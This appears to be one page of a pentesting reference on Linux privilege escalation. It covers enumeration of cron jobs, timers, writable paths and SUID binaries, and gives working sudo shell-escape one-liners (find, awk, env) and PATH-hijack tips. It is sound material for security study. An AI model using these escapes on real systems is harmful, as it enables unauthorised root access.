# Root-run files and services

[← Linux quick reference](../03-linux-privesc.md)

Look for a command or file that root runs and your user can influence. Confirm the exact execution path, its arguments, and its trigger before changing anything.

## Find the path

```bash
sudo -l
ps -eo user,pid,ppid,cmd --forest
find / -xdev -type f -user root -perm -0002 -ls 2>/dev/null
find / -xdev -type d -user root -perm -0002 -ls 2>/dev/null
namei -l /path/to/root-run-script
```

For scheduled work, inspect the referenced unit or script. A timer's existence alone does not tell you which user its service runs as.

```bash
cat /etc/crontab
ls -lah /etc/cron.* /var/spool/cron 2>/dev/null
systemctl list-timers --all
systemctl cat <service>
systemctl show <service> -p User,Group,ExecStart,Environment
```

Check relative command names, writable paths, wildcards, and preserved environment variables:

```bash
echo "$PATH"
find / -xdev -type d -writable -ls 2>/dev/null
grep -R "\*" /etc/cron.* /etc/systemd/system /usr/lib/systemd/system 2>/dev/null
```

## Sudo and SUID

Read the full `sudo -l` rule: command, arguments, `NOPASSWD`, and `env_keep`. A matching binary can have different escape paths across versions; check [GTFOBins](https://gtfobins.github.io/) and test the installed version.

```bash
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN{system("/bin/sh")}'
sudo env /bin/sh
```

A custom SUID program that calls a command without an absolute path is a candidate for PATH control. Inspect its calls first. `bash -p` preserves an effective UID on a confirmed SUID Bash path.

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
strings <candidate-binary>
```

## Before modifying a root-run file

Record its original contents and permissions. Make one change, trigger the known path, verify the result, then restore the original state.
